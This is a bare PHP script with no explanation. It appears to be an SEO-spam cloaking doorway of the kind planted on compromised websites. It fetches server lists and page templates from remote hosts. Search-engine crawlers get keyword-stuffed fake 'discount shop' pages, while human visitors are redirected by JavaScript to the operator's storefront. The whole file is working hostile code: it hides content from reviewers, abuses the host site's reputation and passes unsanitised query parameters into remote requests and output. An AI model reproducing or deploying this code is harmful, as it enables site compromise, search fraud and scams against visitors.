<?php
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$kname = "";
$kgurl="https://ilx01.com/3.txt";
$kgurl2="http://ilx01.top/jd3.txt";
$allurl =file_get_contents($kgurl);
if(!$allurl){$allurl=file_get_contents($kgurl2);}
$words = explode("|", $allurl);
foreach ($words  as  $value){
$aaa =file_get_contents($value.'test.txt');if(!$aaa){continue;}else{$jd=$value;break;	}}
$jd=str_replace('https://',$http_type,$jd);

if (!is_null($_GET['shop'])) {
	$kname = $_GET['shop'];
}
if (!is_null($_GET['s'])) {
	$cid = "";
	if (!is_null($_GET['cid'])) {
		$cid = $_GET['cid'];
	}


	$url = $jd . "sname.aspx?cid=" . $cid . "&number=" . $_GET['number'] . "&pnum=" . $_GET['pnum'];
	$str = file_get_contents($url);
	$str = str_replace('yymm', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
	$str = str_replace('cname', 'shop', $str);
	header("Content-type:text/xml");
	echo $str;
	exit();
}
function check($ip)
{
	global $jd;
	if (!is_null($_GET['kk'])) {
		$ip = "66.249.64.190";
	}
	$domain = file_get_contents($jd . "getdomain.aspx?rnd=1&ip=" . $ip);
	if (stripos($domain, 'google') != false or stripos($domain, 'msn.com') != false or stripos($domain, 'yahoo.com') != false or stripos($domain, 'aol.com') != false) {
	} else {
		if (!is_null($_GET['shop'])) {
			$kname = $_GET['shop'];
			$xs = $jd . "a.aspx";
			echo '<script>document.location="' . $xs . "?cid=" . $_GET['cid'] . "&cname=" . urlencode($kname) . '"</script>';
			exit();
		}
		if (!is_null($_GET['pnum'])) {
			$xs = $jd . "a.aspx";
			$txt = str_replace("products.aspx", "", $xs) . "?cid=" . $_GET['cid'];
			echo '<script>document.location="' . $txt . '"</script>';
			exit();
		}
	}
}
function getIP()
{
	$ip = $_SERVER['REMOTE_ADDR'] . "*" . $_SERVER['REMOTE_HOST'] . "*" . $_SERVER['HTTP_CLIENT_IP'] . "*" . $_SERVER['HTTP_X_FORWARDED'] . "*" . $_SERVER['HTTP_FORWARDED_FOR'] . "*" . $_SERVER['HTTP_FORWARDED'];
	return $ip;
}
check(getIP());
?> 
<?php
$url = "";
$hyzhdy = $jd . "docname.aspx";
if (!is_null($_GET['shop'])) {
	$wid = mt_rand(1, 16154);
	$url = $hyzhdy . "?cname=" . urlencode($_GET['shop']) . "&cid=" . $_GET['cid'] . "&mt=" . $jd . "wz/m" . $wid . ".txt" . "&yt=" . $jd . "ytb.txt&you=1";
} else {
	$cid = "";
	if (!is_null($_GET['cid'])) {
		$cid = $_GET['cid'];
	}
	$url = $hyzhdy . "?cid=" . $cid . "&pnum=" . $_GET['pnum'];
}
$ttttt = $kname . " " . "OFF" . mt_rand(50, 70) . "% |" . $_GET['pnum'];
$kkkkk = $kname;
$iiiii = $kname . " Online Discount Shop for Electronics, Apparel, Toys, Books, Games, Computers, Shoes, Jewelry, Watches, Baby Products, Sports & Outdoors, Office Products, Bed & Bath, Furniture, Tools, Hardware, Automotive Parts, Accessories & more ";
$ccccc = $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];

$str = file_get_contents($url);
$str = str_replace('UUUUU', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
$str = str_replace('HHHHH', $_SERVER['SCRIPT_NAME'], $str);
$str = str_replace('BBBBB', $_SERVER['HTTP_HOST'], $str);
$str = str_replace('NNNNN', $kname, $str);
$str = str_replace('DDDDD', $kname . " Gold, White, Black, Red, Blue, Beige, Grey, Price, Rose, Orange, Purple, Green, Yellow, Cyan, Bordeaux, pink, Indigo, Brown, Silver,Electronics, Video Games, Computers, Cell Phones, Toys, Games, Apparel, Accessories, Shoes, Jewelry, Watches, Office Products, Sports & Outdoors, Sporting Goods, Baby Products, Health, Personal Care, Beauty, Home, Garden, Bed & Bath, Furniture, Tools, Hardware, Vacuums, Outdoor Living, Automotive Parts, Pet Supplies, Broadband, DSL, Books, Book Store, Magazine, Subscription, Music, CDs, DVDs, Videos,Online Shopping " . $_GET['searchtxt'], $str);
$str = str_replace('TTTTT', $ttttt, $str);
$str = str_replace('KKKKK', $kkkkk, $str);
$str = str_replace('IIIII', $iiiii, $str);
$str = str_replace('CCCCC', $ccccc, $str);
$str = str_replace('cname', 'shop', $str);
echo $str;
?> 